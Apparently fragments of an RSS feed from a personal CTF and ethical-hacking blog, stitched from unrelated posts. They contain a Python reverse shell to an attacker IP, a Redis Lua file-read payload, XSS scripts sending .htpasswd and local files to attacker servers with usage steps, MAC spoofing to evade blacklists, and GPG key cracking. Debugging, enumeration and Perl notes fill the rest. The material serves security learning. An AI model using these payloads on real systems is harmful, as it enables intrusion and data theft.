&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.9.50.114&amp;#34;,3232));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Connects back to attacker IP &lt;code&gt;10.9.50.114&lt;/code&gt; on port &lt;code&gt;3232&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Uses socket, duplicates file descriptors for stdin/stdout/stderr.&lt;/li&gt;
&lt;li&gt;Spawns an interactive &lt;code&gt;/bin/sh&lt;/code&gt; shell.&lt;/li&gt;
&lt;li&gt;Works on most Linux systems with Python 3 installed.&lt;/li&gt;
&lt;/ul&gt;

      <description>&lt;p&gt;Redis allows the execution of Lua scripts through the &lt;code&gt;EVAL&lt;/code&gt; command. If Redis is misconfigured or exposed to attackers, the Lua scripting engine can be used to execute arbitrary commands, including reading files on the system.&lt;/p&gt;
&lt;h3 id=&#34;file-read-via-eval-command&#34;&gt;File Read via &lt;code&gt;EVAL&lt;/code&gt; Command&lt;/h3&gt;
&lt;p&gt;You can read the contents of a file (e.g., &lt;code&gt;/flag.txt&lt;/code&gt;) using the &lt;code&gt;EVAL&lt;/code&gt; command in the Redis interactive shell:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;EVAL &lt;span class=&#34;s2&#34;&gt;&amp;#34;return io.popen(&amp;#39;cat /flag.txt&amp;#39;):read(&amp;#39;*a&amp;#39;)&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>

      <description>&lt;p&gt;This guide walks through analyzing a basic binary (e.g., &lt;code&gt;crackme&lt;/code&gt;) using &lt;code&gt;pwndbg&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;1-initial-reconnaissance&#34;&gt;1. Initial Reconnaissance&lt;/h2&gt;
&lt;p&gt;Start &lt;code&gt;gdb&lt;/code&gt; with the binary:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ gdb ./crackme
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;list-functions&#34;&gt;List Functions&lt;/h3&gt;
&lt;p&gt;To see all defined functions in the binary (useful to find &lt;code&gt;main&lt;/code&gt; or custom functions):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pwndbg&amp;gt; info functions
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Output Analysis:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Look for &lt;code&gt;main&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Ignore standard library functions like &lt;code&gt;puts@plt&lt;/code&gt;, &lt;code&gt;__isoc99_scanf@plt&lt;/code&gt;, &lt;code&gt;_start&lt;/code&gt;, etc., unless necessary.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Tip&lt;/strong&gt;: You can filtering with regex: &lt;code&gt;info functions main&lt;/code&gt; or &lt;code&gt;info functions ^my_&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;2-static-analysis-disassembly&#34;&gt;2. Static Analysis (Disassembly)&lt;/h2&gt;
&lt;p&gt;Once you identify interesting functions (like &lt;code&gt;main&lt;/code&gt;), disassemble them to see the instructions.&lt;/p&gt;</description>

      <description>&lt;p&gt;To scan for &lt;code&gt;rpcbind&lt;/code&gt; on a network and check NFS shares, use the following command:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo nmap -p &lt;span class=&#34;m&#34;&gt;111&lt;/span&gt; --script&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;nfs-ls,nfs-statfs,nfs-showmount &lt;span class=&#34;nv&#34;&gt;$IP&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# Scanning port 111 for rpcbind and list NFS shares&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;listing-mounted-partitions-on-the-network&#34;&gt;Listing Mounted Partitions on the Network&lt;/h3&gt;
&lt;p&gt;To list the mounted partitions of a network system, use:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;showmount -e &lt;span class=&#34;nv&#34;&gt;$IP&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# List the exported directories on the NFS server&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h1 id=&#34;mounting-rpcbind-directories-on-local-machine&#34;&gt;Mounting &lt;code&gt;rpcbind&lt;/code&gt; Directories on Local Machine&lt;/h1&gt;

      <guid>http://localhost:1313/posts/tipsandtricks/archlinux/persistent-mac-address-spoofing-as-a-networkmanager-services-not-stable-and-not-recommand/</guid>
      <description>&lt;p&gt;This method allows users to change their WiFi adapter&amp;rsquo;s MAC address persistently. It also enables users to bypass MAC address blacklisting by network owners, as it allows connection to WiFi networks with a spoofed MAC address.&lt;/p&gt;
&lt;h3 id=&#34;step-1-writing-a-systemd-service&#34;&gt;Step 1: Writing a systemd Service&lt;/h3&gt;
&lt;p&gt;Create a systemd service to change your MAC address and place it in the &lt;code&gt;/etc/systemd/system/&lt;/code&gt; directory with the name &lt;code&gt;mac-spoofer.service&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /etc/systemd/system/mac-spoofer.service
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Unit]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Description=MAC Address Change/spoofing wlo1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Wants=network-pre.target
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Before=network-pre.target

&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;After=sys-subsystem-net-devices-wlo1.device
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Service]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Type=oneshot
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;User=root
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ExecStart=/usr/bin/ifconfig wlo1 down
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ExecStart=/usr/bin/macchanger -r -b wlo1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ExecStart=/usr/bin/ifconfig wlo1 up
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Install]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;WantedBy=multi-user.target
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;step-2-creating-a-dispatcher-script&#34;&gt;Step 2: Creating a Dispatcher Script&lt;/h3&gt;
&lt;p&gt;Create a script in the &lt;code&gt;/etc/NetworkManager/dispatcher.d/&lt;/code&gt; directory and grant it executable permission. This directory contains scripts to handle various network-related events, which are automatically executed in response to specific events managed by NetworkManager.&lt;/p&gt;</description>

      <description>&lt;p&gt;To see available keys in your system&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ gpg --list-secret-keys
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If you have a backup.gpg keys with encrypted format.&lt;/p&gt;
&lt;p&gt;Then you need a key to decode it. If you found the key in some file. Then simple import that file in your syste&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ gpg --import private.asc
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If the private.asc file is in encrypted format then they ask password to decrypt and import to our system.
we can also crack private.asc key by extracting hash from it by using john&lt;/p&gt;</description>

      <title>Tutorial: String Manipulation in Perl with s///, y///, and s///g</title>
      <link>http://localhost:1313/posts/tipsandtricks/cheatsheets/perl-rename-tutorial/</link>
      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/tipsandtricks/cheatsheets/perl-rename-tutorial/</guid>
      <description>&lt;p&gt;Perl provides powerful operators for manipulating strings using regular expressions. Here&amp;rsquo;s a breakdown of each operator with examples:&lt;/p&gt;
&lt;h3 id=&#34;s-substitution-operator&#34;&gt;s/// (Substitution Operator)&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Syntax:&lt;/strong&gt; &lt;code&gt;s/old-pattern/new-pattern/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Purpose:&lt;/strong&gt; Replaces occurrences of &lt;code&gt;old-pattern&lt;/code&gt; with &lt;code&gt;new-pattern&lt;/code&gt; in a string.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Example:&lt;/strong&gt; &lt;code&gt;s/John/Doe/&lt;/code&gt; replaces the first instance of &amp;ldquo;John&amp;rdquo; with &amp;ldquo;Doe&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Example 1: Replace &amp;ldquo;John&amp;rdquo; with &amp;ldquo;Doe&amp;rdquo;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;text = &amp;#34;Hello John. John is a friend.&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;regex = s/John/Doe/;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# Result: &amp;#34;Hello Doe. John is a friend.&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Example 2: Replace &amp;ldquo;white&amp;rdquo; with &amp;ldquo;black&amp;rdquo;&lt;/strong&gt;&lt;/p&gt;</description>

      <description>&lt;p&gt;You can call me Gajendra. I’m working to become a skilled ethical hacker and bug bounty hunter, focusing on learning practical cybersecurity techniques and offensive security methods. I prefer responses that are clear, technical, and straight to the point, with real-world examples related to CTF challenges and red/blue teaming. Keep it simple, focused on Linux/Arch Linux, and give me actionable insights.&lt;/p&gt;
&lt;h2 id=&#34;what-do-you-do&#34;&gt;What do you do?&lt;/h2&gt;
&lt;p&gt;I’m a student of Bachelor in Information Technology with a passion for cybersecurity, focusing on red teaming, blue teaming, bug bounties, and CTF challenges. My goal is to specialize in both offensive and defensive security techniques to become a professional ethical hacker. I actively participate in CTFs on platforms like TryHackMe and HackTheBox. Additionally, I’m learning programming languages such as Bash, Python, PHP, C, HTML, and JavaScript to better understand applications from a developer&amp;rsquo;s perspective and secure them by identifying vulnerabilities before malicious actors can exploit them.&lt;/p&gt;</description>

&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Error fetching the messages:&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;explanation&#34;&gt;Explanation:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;This script tries to &lt;strong&gt;read the &lt;code&gt;.htpasswd&lt;/code&gt; file&lt;/strong&gt; from a vulnerable server using a &lt;strong&gt;local file inclusion (LFI) or file read vulnerability&lt;/strong&gt; in the URL parameter &lt;code&gt;file&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Then, it sends the stolen file content back to your attacker server (&lt;code&gt;10.10.14.228&lt;/code&gt;) using an HTTP request with the data URL-encoded.&lt;/li&gt;
&lt;li&gt;Works in XSS vulnerable pages where you can inject JS.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;how-to-use&#34;&gt;How to use:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Inject this script into an XSS vulnerable parameter or stored XSS vector.&lt;/li&gt;
&lt;li&gt;Make sure your attacker machine (&lt;code&gt;10.10.14.228&lt;/code&gt;) is ready to receive GET requests and log the &lt;code&gt;data&lt;/code&gt; parameter.&lt;/li&gt;

&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;explanation-1&#34;&gt;Explanation:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;This script fetches a local file on the victim machine (&lt;code&gt;http://127.0.0.1/dir/pass.txt&lt;/code&gt;) via the victim’s browser.&lt;/li&gt;
&lt;li&gt;When the file is fully loaded (&lt;code&gt;DONE&lt;/code&gt;), it encodes the content in Base64 (&lt;code&gt;btoa&lt;/code&gt;) to safely transmit binary or special characters.&lt;/li&gt;
&lt;li&gt;Then sends this encoded content back to attacker server by requesting the script file with data as query string (&lt;code&gt;?data=...&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;Requires you to host this script on your attacker machine (&lt;code&gt;10.9.179.230&lt;/code&gt;) and have an HTTP server running on port 1212.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;how-to-use-1&#34;&gt;How to use:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Start HTTP server on attacker box:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 -m http.server &lt;span class=&#34;m&#34;&gt;1212&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Inject &lt;code&gt;&amp;lt;script src=&amp;quot;http://10.9.179.230:1212/steal_page_content_xss.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt; into an XSS vulnerable page.&lt;/li&gt;
&lt;li&gt;Monitor requests on your attacker server to capture the Base64 encoded file contents in the URL.&lt;/li&gt;
&lt;li&gt;Decode captured Base64 content:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;base64_encoded_string&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 -d &amp;gt; stolen_file.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h2 id=&#34;summary-notes&#34;&gt;Summary Notes:&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;These methods depend on the target browser having access to local files via URL paths (like &lt;code&gt;127.0.0.1&lt;/code&gt;) or vulnerable parameters (LFI).&lt;/li&gt;
&lt;li&gt;Base64 encoding helps send files safely in GET requests.&lt;/li&gt;
&lt;li&gt;Must have control over attacker server to catch stolen data.&lt;/li&gt;
&lt;li&gt;Use during CTF challenges, penetration testing, or in controlled environments.&lt;/li&gt;
&lt;li&gt;Always check the same-origin policy and CORS restrictions which may block requests in real-world targets.&lt;/li&gt;
